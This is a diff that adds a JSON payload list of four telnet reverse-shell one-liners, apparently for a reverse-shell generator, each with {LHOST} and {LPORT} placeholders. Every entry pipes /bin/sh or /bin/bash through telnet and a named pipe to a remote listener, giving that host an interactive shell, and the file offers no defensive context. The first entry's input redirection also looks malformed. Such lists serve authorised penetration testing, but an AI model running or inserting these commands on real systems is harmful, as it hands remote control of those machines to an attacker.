@@ -1,0 +1,30 @@
+[
+  {
+    "type": "telnet",
+    "direction": "reverse",
+    "payload": "rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1",
+    "note": null,
+    "id": "telnet1"
+  },
+  {
+    "type": "telnet",
+    "direction": "reverse",
+    "payload": "telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667",
+    "note": null,
+    "id": "telnet2"
+  },
+  {
+    "type": "telnet",
+    "direction": "reverse",
+    "payload": "rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f",
+    "note": null,
+    "id": "telnet3"
+  },
+  {
+    "type": "telnet",
+    "direction": "reverse",
+    "payload": "rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x",
+    "note": null,
+    "id": "telnet4"
+  }
+]
